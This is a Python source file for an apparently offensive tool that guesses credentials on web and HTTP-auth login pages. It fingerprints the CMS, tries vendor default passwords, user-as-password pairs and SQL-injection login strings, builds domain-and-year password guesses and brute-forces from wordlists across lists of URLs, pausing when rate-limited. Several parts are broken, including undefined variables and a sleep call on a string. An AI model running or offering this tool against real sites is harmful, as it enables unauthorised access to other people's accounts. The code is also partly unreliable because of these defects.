#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import traceback
import sys, os, re
import time

from fingerprint.finger_printing import finger_print
from templates.cms_templates import cms_input
from templates.other_templates import other_input
from credz.default_password import default_passwords
from color_config import INFO, found, not_found, action_not_found, action_found
from modules.http_authent import http_auth
from modules.default_error_page import first_check

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

UserAgent = {'User-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko'}


class all_default_tests:

    def default_user_as_pass(self, url, username_input=False, password_input=False, fc=False, basic=False):
        payl = ["admin", "administrateur", "test", "root", "guest", "anonymous", "a'or 1=1#", "a'or 1=1 or'"]

        account_found = False
        for p in payl:
            login = {username_input: p, password_input: p}
            req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10) if not basic else requests.post(url, auth=(p, p), verify=False, allow_redirects=False, timeout=10, headers=UserAgent)
            
            if type(fc) != int:
                if len(req.text) != fc[0] and len(req.text) != fc[1] and req.status_code not in [401, 403]:
                    print("  {}Potentially account or username found: {}:{}".format(found, p, p))
                    account_found = True
            else:
                if len(req.text) not in range(fc - 100, fc + 100) and req.status_code not in [401, 403]:
                    print("  {}Potentially account or username found: {}:{}".format(found, p, p))
                    account_found = True
                elif len(req.text) not in range(fc - 200, fc + 200) and req.status_code not in [401, 403]:
                    print("  {}Account found: {}:{}".format(found, p, p))
                    if not urls_file:
                        sys.exit()
            
            sys.stdout.write("\033[34muser: {} | password: {}\033[0m\r".format(p, p))
            sys.stdout.write("\033[K")
        return account_found


    def test_default_password(self, url, username_input, password_input, username, password, fc):
        """
        test_default_password: Test known default password
        """
        login = {username_input: username, password_input: password}
        req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10, headers=UserAgent)
        if len(req.text) not in range(fc - 100, fc + 100) and req.status_code not in [401, 403]:
            print("  {}Potentially account or username found: {}".format(found, login))
        elif len(req.text) not in range(fc - 200, fc + 200) and req.status_code not in [401, 403]:
            print("  {}Account found: {}".format(found, login))
            if not urls_file:
                sys.exit()
            return True
        sys.stdout.write("\033[34muser: {} | password: {}\033[0m\r".format(username, password))
        sys.stdout.write("\033[K")


    def default_domain_test(self, url, domain, app_type, inputs=False):
        print(" {} Default domain test".format(INFO))

        #username_input, password_input, other_param, other_param_value = check_param(inputs)
        fc = first_check(url, username_input, password_input, other_param_value) if len(inputs.split(":")) > 2 else first_check(url, username_input, password_input)

        users = ["admin", "administrateur", "test", "root", "guest"] if not user_known else [user_default]

        dico_user_reuse = [
        "{}".format(domain), "{}@".format(domain),
        "{}2016".format(domain),"{}2017".format(domain),"{}2018".format(domain),"{}2019".format(domain),"{}2020".format(domain), "{}2021".format(domain), 
        "{}2016*".format(domain),"{}2017*".format(domain),"{}2018*".format(domain),"{}2019*".format(domain),"{}2020*".format(domain),"{}2021*".format(domain), 
        "{}@2016".format(domain),"{}@2017".format(domain),"{}@2018".format(domain),"{}@2019".format(domain),"{}@2020".format(domain),"{}@2021".format(domain),
        "{}2016!".format(domain),"{}2017!".format(domain),"{}2018!".format(domain),"{}2019!".format(domain),"{}2020!".format(domain),"{}2021!".format(domain),
        "{}123".format(domain), "{}123!".format(domain), "{}@123!".format(domain), "{}@123*".format(domain)]
        for user in users:
            for passwd in dico_user_reuse:
                if app_type != "web":
                    req = requests.post(url, auth=(user, passwd), verify=False, allow_redirects=False, timeout=10)
                else:
                    datas = {username_input: user, password_input: passwd, other_param: other_param_value} if len(inputs.split(":")) > 2 else {username_input: user, password_input: passwd}
                    req = requests.post(url, data=datas, verify=False, allow_redirects=False, timeout=10, headers=UserAgent)
                if len(req.text) not in range(fc - 100, fc + 100) and req.status_code not in [401, 403]:
                    print("  {} Potentially account or username found: {}:{}".format(found, user, passwd))
                elif len(req.text) not in range(fc - 200, fc + 200) and req.status_code not in [401, 403]:
                    print("  {} Account found: {}:{}".format(found, user, passw))
                    sys.exit()
                elif req.status_code in [301, 302]:
                    req2 = requests.post(url, data=datas, verify=False, allow_redirects=False, timeout=10, headers=UserAgent)
                    print(req2.headers.get("Location"))
                    if req2.headers.get("Location") != req.headers.get("Location"):
                        print("  {}Account found: {}:{}".format(found, user, passwd))
                sys.stdout.write("\033[34muser: {} | password: {}\033[0m\r".format(user, passwd))
                sys.stdout.write("\033[K")



def bf_top_password(url, username_input, password_input, fc, username=False):
    if not onlypass:
        print(" {} Bruteforce username:password".format(INFO))
        usernames = []
        if username:
            usernames.append(username)
        elif user_known:
            usernames = user_default
        else:
            with open("credz/wordlists/top_default_username.txt", "r") as users:
                usernames += users
        for user in usernames:
            user = user.replace("\n","")
            with open(wordlist, "r+") as top_pass:
                for tp in top_pass.read().splitlines():
                    login = {username_input: user, password_input: tp}
                    req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10, headers=UserAgent)
                    if len(req.text) not in range(fc - 100, fc + 100) and req.status_code not in [401, 403]:
                        print("  {}Potentially account or username found: {}".format(found, login))
                    elif len(req.text) not in range(fc - 200, fc + 200) and req.status_code not in [401, 403]:
                        print("  {}Account found: {}".format(found, login))
                        #continue_scan = input(" {} An account was found do you want continue to check another account ? (y:n):".format(INFO))
                        if not urls_file:
                            sys.exit()
                        return True
                    sys.stdout.write("\033[34muser: {} | password: {}\033[0m\r".format(user, tp))
                    sys.stdout.write("\033[K")
    else:
        print(" {} Bruteforce password".format(INFO))
        with open(wordlist, "r+") as top_pass:
            for tp in top_pass.read().splitlines():
                login = {password_input: tp}
                req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10, headers=UserAgent)
                if len(req.text) not in range(fc - 100, fc + 100) and req.status_code not in [401, 403]:
                    print("  {}Potentially password: {}".format(found, login))
                elif len(req.text) not in range(fc - 200, fc + 200) and req.status_code not in [401, 403]:
                    print("  {}Password found: {}".format(found, login))
                    #continue_scan = input(" {} An account was found do you want continue to check another account ? (y:n):".format(INFO))
                    if not urls_file:
                        sys.exit()
                    return True
                elif "Too many" in req.text or req.status_code == 429:
                    from threading import Timer

                    timeout = 10
                    t = Timer(timeout, print, ['Sorry, times up'])
                    t.start()
                    prompt = "Too many failed attempts, please defined how much time you will wait (wait 10scd for default 60s): "
                    answer = input(prompt)
                    t.cancel()
                    if answer:
                        time.sleep(answer)
                    else:
                        time.sleep(60)
                sys.stdout.write("\033[34 password: {}\033[0m\r".format(tp))
                sys.stdout.write("\033[K")


def check_param(inputs, url):
    global username_input
    username_input = inputs.split(":")[0]
    global password_input
    password_input = inputs.split(":")[1]

    req = requests.get(url, verify=False, timeout=10, headers=UserAgent)

    if username_input in req.text and password_input in req.text:
        if len(inputs.split(":")) > 2:
            global other_param
            other_param = inputs.split(":")[2]
            global other_param_value
            other_param_value = input(" {} Please define the {} parameter [login:pass]: ".format(INFO, inputs.split(":")[2]))
    else:
        other_input_value = input(" {} CMS basic input dosn't seem ok, please define input [login:pass]: ".format(INFO))
        username_input = other_input_value.split(":")[0]
        password_input = other_input_value.split(":")[1]


def test_credz(url, credz_input, adt, type_techno=False):
    tdp = False

    check_param(credz_input, url)

    fc = first_check(url, username_input, password_input, other_param_value) if len(credz_input.split(":")) > 2 else first_check(url, username_input, password_input)

    if type_techno:
        for dp in default_passwords:
            if dp == type_techno.lower():
                for d in default_passwords[dp]:
                    username = d.split(":")[0]
                    password = d.split(":")[1]
                    print(" {} Default credentials: {}:{}".format(INFO, username, password))
                    tdp = adt.test_default_password(url, username_input, password_input, username, password, fc)
                if not tdp and bf:
                    for d in default_passwords[dp]:
                        username = d.split(":")[0]
                        btp = bf_top_password(url, username_input, password_input, fc, username)
    if not tdp:
        print("-"*30)
        print(" {} Test user-as-pass".format(INFO))
        user_as_pass = adt.default_user_as_pass(url, username_input, password_input, fc)
        if not user_as_pass:
            print(" {} user-as-pass account not found".format(action_not_found))
        if bf:
            btp = bf_top_password(url, username_input, password_input, fc)
            if not btp:
                print(" {} Default Account not found".format(action_not_found))



def main(url, domain=False, cms_value=True):
    fg = finger_print()

    adt = all_default_tests();

    app_type = fg.whatisapp(url) #Check what is the website type

    if app_type != "web":
        # Launch basic http authent
        if domain:
            adt.default_domain_test(url, domain, app_type)
        other_name = fg.other_check(url, http_auth=True)
        http_auth(url, user_known, wordlist, bf, other_name) if other_name else http_auth(url, user_known, wordlist, bf)
    else:
        try:   
            cms_name = fg.cms_check(url) if cms_value else cms_value
            #Get cms name if that's a CMS
            if cms_name:
                print(" {} CMS verification".format(INFO)) 
                print(" {}{}".format(action_found, cms_name))
                credz_input = cms_input(cms_name)
                if credz_input:
                    test_credz(url, credz_input, adt, cms_name)
                    if domain:
                        adt.default_domain_test(url, domain, app_type, inputs=credz_input)
                else:
                    print(" {} CMS template not found".format(action_not_found))
                    main(url, domain=domain, cms_value=False)
            else:
                other_name = fg.other_check(url, onlypass)
                # Check if the techno is know and in the db
                if len(other_name) > 2:
                    if onlypass:
                        fc = first_check(url, None, other_name)
                        bf_top_password(url, None, other_name, fc)
                    else:   
                        #if there are more 2 parameter to send
                        credz_input = other_input(other_name)
                        test_credz(url, credz_input, adt, other_name)
                        if domain:
                            adt.default_domain_test(url, domain, app_type, inputs=credz_input)
                elif len(other_name) == 2:
                    credz_input = "{}:{}".format(other_name[0], other_name[1])
                    test_credz(url, credz_input, adt)
                    if domain:
                        adt.default_domain_test(url, domain, app_type, inputs=credz_input)
                else:
                    print(" {} Nothing template found".format(action_not_found))
        except KeyboardInterrupt:
            if not file_url:
                print(" {}Canceled by keyboard interrupt (Ctrl-C) ".format(INFO))
                sys.exit()
            else:
                print(" {}Canceled by keyboard interrupt (Ctrl-C), next site ".format(INFO))
    print("-"*30)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument("-u", help="URL login to test \033[31m[required]\033[0m", dest='url')
    parser.add_argument('-U', '--urls_file', action='store_true', help='Provide file instead of url, one per line.', dest='urls_file')
    parser.add_argument('-w', help="list of your passwords to test \033[32mDefault: credz/wordlists/top_200_default_passwd.txt\033[0m", dest='wordlist', default="credz/wordlists/top_200_default_passwd.txt", action='store_true')
    parser.add_argument('-b', '--bruteforce', help="Bruteforce username/password", action='store_true', dest='bf')
    parser.add_argument('-i', '--inputs', help="if that not found inputs during the scan, this option add auto in inputs.txt file. Ex: -i \"user:passwd\" ", required=False, dest='inputs')
    parser.add_argument('-k', '--key_words', help="if you want add personal password in list ", required=False, dest='key_words', nargs="*", action="store")
    parser.add_argument('-d', '--domain', help="Add domain to test all combinaison like domain@2019, domain2021...", required=False, dest='domain', action="store")
    parser.add_argument('-uap', '--user-as-pass',  help='test user-as-pass', dest='uap', action='store_true')
    parser.add_argument("--user", help="If you want test just a known username", required=False, dest='user_known', action="store")
    parser.add_argument('--onlypass', '--onlypass', help="If there is just only password to test", required=False, dest='onlypass', action="store_true")

    results = parser.parse_args()
                                     
    url = results.url
    urls_file = results.urls_file
    user_known = results.user_known
    wordlist = results.wordlist
    uap = results.uap #TODO
    bf = results.bf
    inputs = results.inputs
    key_words = results.key_words
    domain = results.domain
    onlypass = results.onlypass


    if user_known:
        global user_default 
        user_default = user_known
    if len(sys.argv) < 2:
        print("{}URL target is missing, try using -u <url> or -h for help".format(INFO))
        parser.print_help()
        sys.exit()
    if inputs:
        with open("fingerprint/inputs.txt", "a+") as add_input:
            add_input.write(inputs+"\n")
    if key_words:
        for k in key_words:
            with open("credz/wordlits/my_passwords.txt", "a+") as add_pass:
                add_pass.write(k+"\n")
        wordlist = "credz/my_passwords.txt"
    if not urls_file:
        print("\033[35m URL: {}\033[0m".format(url))
        #url = url + "/" if url.split("/")[-1] != "" else url
        main(url, domain if domain else False)
    else:
        with open(urls_file, "r+") as uf:
            for u in uf.readlines():
                print(" [i] URL: {}".format(u))
                main(u.strip(), domain if domain else False)